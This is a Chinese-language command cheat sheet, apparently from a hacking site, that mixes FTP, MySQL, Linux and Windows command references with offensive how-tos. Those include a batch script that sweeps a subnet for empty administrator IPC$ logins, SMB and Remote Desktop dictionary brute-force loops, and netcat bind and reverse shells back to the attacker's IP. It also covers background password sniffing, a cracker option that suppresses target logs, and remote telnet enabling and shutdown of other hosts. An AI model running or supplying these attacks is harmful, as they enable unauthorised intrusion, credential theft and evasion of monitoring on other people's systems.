mget [remote-files] 从远端主机接收一批文件至本地主机 
mput local-files 将本地主机中一批文件传送至远端主机 
dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件 
ascii 设定以ASCII方式传送文件(缺省值) 
bin 或 image 设定以二进制方式传送文件 
bell 每完成一次文件传送,报警提示 
cdup 返回上一级目录 
close 中断与远程服务器的ftp会话(与open对应) 
open host[port] 建立指定ftp服务器连接,可指定连接端口 
delete 删除远端主机中的文件 
mdelete [remote-files] 删除一批文件 
mkdir directory-name 在远端主机中建立目录 
rename [from] [to] 改变远端主机中的文件名 
rmdir directory-name 删除远端主机中的目录 
status 显示当前FTP的状态 
system 显示远端主机系统类型 
user user-name [password] [account] 重新以别的用户名登录远端主机 
open host [port] 重新建立一个新的连接 
prompt 交互提示模式 
macdef 定义宏命令 
lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录 
chmod 改变远端主机的文件权限 
case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母 
cd remote－dir 进入远程主机目录 
cdup 进入远程主机目录的父目录 
! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip 

【5】 

MYSQL 命令： 
mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。 
（例：mysql -h110.110.110.110 -Uroot -P123456 
注:u与root可以不用加空格，其它也一样） 
exit 退出MYSQL 
mysql*** -u用户名 -p旧密码 password 新密码 修改密码 
grant select on 数据库.* to 用户名@登录主机 identified by \"密码\"; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符） 
show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。 
use mysql； 
show tables; 显示库中的数据表 
describe 表名; 显示数据表的结构 
create database 库名; 建库 
use 库名； 
create table 表名 (字段设定列表)； 建表 
drop database 库名; 
drop table 表名； 删库和删表 
delete from 表名; 将表中记录清空 
select * from 表名; 显示表中的记录 
mysqldump --opt school>school.bbb 备份数据库：（命令在DOS的\\mysql\\bin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。 
win2003系统下新增命令（实用部份）： 
shutdown /参数 关闭或重启本地或远程主机。 
参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。 
例：shutdown /r /t 0 立即重启本地主机（无延时） 
taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。 
参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 
tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 
参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。 

【6】 

Linux系统下基本命令： 要区分大小写 
uname 显示版本信息（同win2K的 ver） 
dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir） 
pwd 查询当前所在的目录位置 
cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。 
cat 文件名 查看文件内容 
cat >abc.*t 往abc.*t文件中写上内容。 
more 文件名 以一页一页的方式显示一个文本文件。 
cp 复制文件 
mv 移动文件 
rm 文件名 删除文件，rm -a 目录名删除目录及子目录 
mkdir 目录名 建立目录 
rmdir 删除子目录，目录内没有文档。 
chmod 设定档案或目录的存取权限 
grep 在档案中查找字符串 
diff 档案文件比较 
find 档案搜寻 
date 现在的日期、时间 
who 查询目前和你使用同一台机器的人以及Login时间地点 
w 查询目前上机者的详细资料 
whoami 查看自己的帐号名称 
groups 查看某人的Group 
passwd 更改密码 
history 查看自己下过的命令 
ps 显示进程状态 
kill 停止某进程 
gcc 黑客通常用它来编译C语言写的文件 
su 权限转换为指定使用者 
telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。 
ftp ftp连接上某服务器（同win2K） 

【附】批处理命令与变量 

1：for命令及变量 基本格式： 
FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。 
批处理每次能处理的变量从%0―%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2―%9指输入的第2-9个值；例：net use \\ip\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3 

(set):指定一个或一组文件，可使用通配符，如：(D:\user.*t)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个"1"指起始值，第二个"1"指增长量，第三个"254"指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 } 

command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：& 来隔开 
command_parameters：为特定命令指定参数或命令行开关 

IN (set)：指在(set)中取值；DO command ：指执行command 

参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:\pass.*t)时 }。 
用法举例： 
@echo off 
echo 用法格式：test.bat *.*.* > test.*t 

for /L %%G in (1 1 254) do echo %1.%%G >>test.*t & net use \\%1.%%G /user:***istrator | find "命令成功完成" >>test.*t 
存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立***istrator密码为空的IPC$连接，如果成功就把该IP存在test.*t中。 

/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；& 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有"命令成功完成"信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。 
@echo off 
echo 用法格式：ok.bat ip 
FOR /F %%i IN (D:\user.dic) DO smb.exe %1 %%i D:\pass.dic 200 
存为：ok.exe 说明：输入一个IP后，用字典文件d:\pass.dic来暴解d:\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。http://www.jz5u.com 

【7】 

2：if命令及变量 基本格式： 
IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。 
例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。 
0 指发现并成功执行（真）；1 指没有发现、没执行（假）。 
IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。 
例：“if "%2%"=="4" goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加" "） 
IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。 
例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到":end"标签处。 
IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用< >括起来，因为del命令要单独一行时才能执行，用上< >后就等于是单独一行了；例如：“if exist test.*t. <del test.*t.> else echo test.*t.missing ”，注意命令中的“.” 

（二）【系统外部命令(均需下载相关工具)】 

1、瑞士军刀：nc.exe 

参数说明： 
-h 查看帮助信息 
-d 后台模式 
-e prog程序重定向，一但连接就执行［危险］ 
-i secs延时的间隔 
-l 监听模式，用于入站连接 
-L 监听模式，连接天闭后仍然继续监听，直到CTR+C 
-n IP地址，不能用域名 
-o film记录16进制的传输 
-p[空格]端口 本地端口号 
-r 随机本地及远程端口 
-t 使用Telnet交互方式 
-u UDP模式 
-v 详细输出，用-vv将更详细 
-w数字 timeout延时间隔 
-z 将输入，输出关掉（用于扫锚时） 
基本用法： 
nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口 
nc -l -p 80 开启本机的TCP 80端口并监听 
nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口 
nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口 
nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口 
高级用法： 
nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 
nc -L -p 80 > c:\log.*t 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\log.*t 
nc -L -p 80 < c:\honeyport.*t 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.*t中内容送入管道中，亦可起到传送文件作用 
type.exe c:\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.*t中内容送入管道中,亦可起到传送文件作用 
本机上用：nc -l -p 本机端口 
在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K 
nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙 
本机上用：nc -d -l -p 本机端口 < 要传送的文件路径及名称 
在对方主机上用：nc -vv 本机IP 本机端口 > 存放文件的路径及名称 传送文件到对方主机 
备 注： 
| 管道命令 
< 或 > 重定向命令。“<”，例如：tlntadmn < test.*t 指把test.*t的内容赋值给tlntadmn命令 
＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:\winnt >> d:\log.*t 意思是：后台执行dir，并把结果存在d:\log.*t中 
>与>>的区别 　">"指：覆盖；">>"指：保存到(添加到）。 
如：@dir c:\winnt >> d:\log.*t和@dir c:\winnt > d:\log.*t二个命令分别执行二次比较看：用>>的则是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。 

【8】 

2、扫锚工具：xscan.exe 

基本格式 
xscan -host <起始IP>[-<终止IP>] <检测项目> [其他选项] 扫锚"起始IP到终止IP"段的所有主机信息 
xscan -file <主机列表文件名> <检测项目> [其他选项] 扫锚"主机IP列表文件名"中的所有主机信息 
检测项目 
-active 检测主机是否存活 
-os 检测远程操作系统类型（通过NETBIOS和SNMP协议） 
-port 检测常用服务的端口状态 
-ftp 检测FTP弱口令 
-pub 检测FTP服务匿名用户写权限 
-pop3 检测POP3-Server弱口令 
-smtp 检测SMTP-Server漏洞 
-sql 检测SQL-Server弱口令 
-smb 检测NT-Server弱口令 
-iis 检测IIS编码/解码漏洞 
-cgi 检测CGI漏洞 
-nasl 加载Nessus攻击脚本 
-all 检测以上所有项目 
其它选项 
-i 适配器编号 设置网络适配器, <适配器编号>可通过"-l"参数获取 
-l 显示所有网络适配器 
-v 显示详细扫描进度 
-p 跳过没有响应的主机 
-o 跳过没有检测到开放端口的主机 
　 -t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10 
-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件) 
用法示例 
xscan -host 192.168.1.1-192.168.255.255 -all -active -p　 检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机 
xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机 
xscan -file hostlist.*t -port -cgi -t 200,5 -v -o 检测“hostlist.*t”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机www.jz5u.com 

【9】 

3、命令行方式嗅探器: xsniff.exe 
可捕获局域网内FTP/SMTP/POP3/HTTP协议密码 
参数说明 
-tcp 输出TCP数据报 
-udp 输出UDP数据报 
-icmp 输出ICMP数据报 
-pass 过滤密码信息 
-hide 后台运行 
-host 解析主机名 
-addr IP地址 过滤IP地址 
-port 端口 过滤端口 
-log 文件名 将输出保存到文件 
-asc 以ASCII形式输出 
-hex 以16进制形式输出 
用法示例 
xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中 
xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出 

4、终端服务密码破解: tscrack.exe 

参数说明 
-h 显示使用帮助 
-v 显示版本信息 
-s 在屏幕上打出解密能力 
-b 密码错误时发出的声音 
-t 同是发出多个连接（多线程） 
-N Prevent System Log entries on targeted server 
-U 卸载移除tscrack组件 
-f 使用－f后面的密码 
-F 间隔时间（频率） 
-l 使用－l后面的用户名 
-w 使用－w后面的密码字典 
-p 使用－p后面的密码 
-D 登录主页面 
用法示例 
tscrack 192.168.0.1 -l ***istrator -w pass.dic 远程用密码字典文件暴破主机的***istrator的登陆密码 
tscrack 192.168.0.1 -l ***istrator -p 123456 用密码123456远程登陆192.168.0.1的***istrator用户 
@if not exist ipcscan.*t goto noscan 
@for /f "tokens=1 delims= " %%i in (3389.*t) do call hack.bat %%i 
nscan 
@echo 3389.*t no find or scan faild 
(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.*t) 
3389.bat意思是：从3389.*t文件中取一个IP，接着运行hack.bat 
@if not exist tscrack.exe goto noscan 
@tscrack %1 -l ***istrator -w pass.dic >>rouji.*t 
:noscan 
@echo tscrack.exe no find or scan faild 
(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.*t、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了) 
hack.bat意思是：运行tscrack.exe用字典暴破3389.*t中所有主机的***istrator密码，并将破解结果保存在rouji.*t文件中。 

5、其它： 

Shutdown.exe 
Shutdown \\IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。） 
fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙） 
fpipe -l 80 -s 1029 -r 80 www.sina.com.cn 当有人扫锚你的80端口时，他扫到的结果会完全是www.sina.com.cn的主机信息 
Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。 
OpenTelnet.exe (远程开启telnet工具) 
opentelnet.exe \\IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet \\ip 连接上对方。 
NTLM认证方式：０：不使用NTLM身份验证；１：先尝试NTLM身份验证，如果失败，再使用用户名和密码；２：只使用NTLM身份验证。 

ResumeTelnet.exe (OpenTelnet附带的另一个工具) 
resumetelnet.exe \\IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。 

【10】 

6、FTP命令详解： 

FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。 

FTP的命令行格式为： 
ftp -v -d -i -n -g [主机名] ，其中 

-v 显示远程服务器的所有响应信息； 

-n 限制ftp的自动登录，即不使用；.n etrc文件； 

-d 使用调试方式； 

-g 取消全局文件名。 

FTP使用的内部命令如下(中括号表示可选项): 

1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip 
2.$ macro-ame[args]： 执行宏定义macro-name。 

3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。 
4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。 

5.ascii：使用ascii类型传输方式。 
6.bell：每个命令执行完毕后计算机响铃一次。 

7.bin：使用二进制文件传输方式。 
8.bye：退出ftp会话过程。 

9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。 
10.cd remote-dir：进入远程主机目录。 

11.cdup：进入远程主机目录的父目录。 
12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。 

13.close：中断与远程服务器的ftp会话(与open对应)。 
14.cr：使用asscii方式传输文件时，将回车换行转换为回行。 

15.delete remote-file：删除远程主机文件。 
16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。 

17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。 
18.disconnection：同close。 

19.form format：将文件传输方式设置为format，缺省为file方式。 
20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。 

21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。 
22.hash：每传输1024字节，显示一个hash符号(#)。 

23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。 
24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。 

25.image：设置二进制传输方式(同binary)。 
26.lcd[dir]：将本地工作目录切换至dir。 

27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。 
28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。 

29.mdelete[remote-file]：删除远程主机文件。 
30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir *.o.*.zipoutfile 。 

31.mget remote-files：传输多个远程文件。 
32.mkdir dir-name：在远程主机中建一目录。 

33.mls remote-file local-file：同nlist，但可指定多个文件名。 
34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。 

35.modtime file-name：显示远程主机文件的最后修改时间。 
36.mput local-file：将多个文件传输至远程主机。 

37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。 
38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。 

39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。 
40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。 

41.open host[port]：建立指定ftp服务器连接，可指定连接端口。 
42.passive：进入被动传输方式。 

43.prompt：设置多个文件传输时的交互提示。 
44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。 
45.put local-file[remote-file]：将本地文件local-file传送至远程主机。 
46.pwd：显示远程主机的当前工作目录。 

47.quit：同bye，退出ftp会话。 
48.quote arg1，arg2...：将参数逐字发至远程ftp服务器，如：quote syst. 

49.recv remote-file[local-file]：同get。 
50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。 

51.rhelp[cmd-name]：请求获得远程主机的帮助。 
52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。 

53.rename[from][to]：更改远程主机文件名。 
54.reset：清除回答队列。 

55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。 
56.rmdir dir-name：删除远程主机目录。 

57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。 
58.send local-file[remote-file]：同put。 

59.sendport：设置PORT命令的使用。 
60.site arg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。 

61.size file-name：显示远程主机文件大小，如：site idle 7200。 
62.status：显示当前ftp状态。www.jz5u.com 

63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。 
64.sunique：将远程主机文件名存储设置为只一(与runique对应)。 

65.system：显示远程主机的操作系统类型。 
66.tenex：将文件传输类型设置为TENEX机的所需的类型。 

67.tick：设置传输时的字节计数器。 
68.trace：设置包跟踪。 

69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。 
70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3 

71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。 
72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on. 

73.?[cmd]：同help. 

【11】 

7：计算机运行命令全集 winver---------检查Windows版本 
wmimgmt.msc----打开windows管理体系结构 
wupdmgr--------windows更新程序 
winver---------检查Windows版本 
wmimgmt.msc----打开windows管理体系结构 
wupdmgr--------windows更新程序 
wscript--------windows脚本宿主设置 
write----------写字板winmsd-----系统信息 
wiaacmgr-------扫描仪和照相机向导 
winchat--------XP自带局域网聊天 
mem.exe--------显示内存使用情况 
Msconfig.exe---系统配置实用程序 
mplayer2-------简易widnows media player 
mspaint--------画图板 
mstsc----------远程桌面连接 
mplayer2-------媒体播放机 
magnify--------放大镜实用程序 
mmc------------打开控制台 
mobsync--------同步命令 
dxdiag---------检查DirectX信息 
drwtsn32------ 系统医生 
devmgmt.msc--- 设备管理器 
dfrg.msc-------磁盘碎片整理程序 
diskmgmt.msc---磁盘管理实用程序 
dcomcnfg-------打开系统组件服务 
ddeshare-------打开DDE共享设置 
dvdplay--------DVD播放器 
net stop messenger-----停止信使服务 
net start messenger----开始信使服务 
notepad--------打开记事本 
nslookup-------网络管理的工具向导 
ntbackup-------系统备份和还原 
narrator-------屏幕"讲述人" 
ntmsmgr.msc----移动存储管理器 
ntmsoprq.msc---移动存储管理员操作请求 
netstat -an----(TC)命令检查接口 
syncapp--------创建一个公文包 
sysedit--------系统配置编辑器 
sigverif-------文件签名验证程序 
sndrec32-------录音机 
shrpubw--------创建共享文件夹 
secpol.msc-----本地安全策略 
syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码 
services.msc---本地服务设置 
Sndvol32-------音量控制程序 
sfc.exe--------系统文件检查器 
sfc /scannow---windows文件保护 
tsshutdn-------60秒倒计时关机命令 
tourstart------xp简介（安装完成后出现的漫游xp程序） 
taskmgr--------任务管理器 
eventvwr-------事件查看器 
eudcedit-------造字程序 
explorer-------打开资源管理器 
packager-------对象包装程序 
perfmon.msc----计算机性能监测程序 
progman--------程序管理器 
regedit.exe----注册表 
rsop.msc-------组策略结果集 
regedt32-------注册表编辑器 
rononce -p ----15秒关机 
regsvr32 /u *.dll----停止dll文件运行 
regsvr32 /u zipfldr.dll------取消ZIP支持 
cmd.exe--------CMD命令提示符 
chkdsk.exe-----Chkdsk磁盘检查 
certmgr.msc----证书管理实用程序 
calc-----------启动计算器 
charmap--------启动字符映射表 
cliconfg-------SQL SERVER 客户端网络实用程序 
Clipbrd--------剪贴板查看器 
conf-----------启动netmeeting 
compmgmt.msc---计算机管理 
cleanmgr-------**整理 
ciadv.msc------索引服务程序 
osk------------打开屏幕键盘 
odbcad32-------ODBC数据源管理器 
oobe/msoobe /a----检查XP是否激活 
lusrmgr.msc----本机用户和组 
logoff---------注销命令 
iexpress-------木马捆绑工具，系统自带 
Nslookup-------IP地址侦测器 
fsmgmt.msc-----共享文件夹管理器 
utilman--------辅助工具管理器 
gpedit.msc-----组策略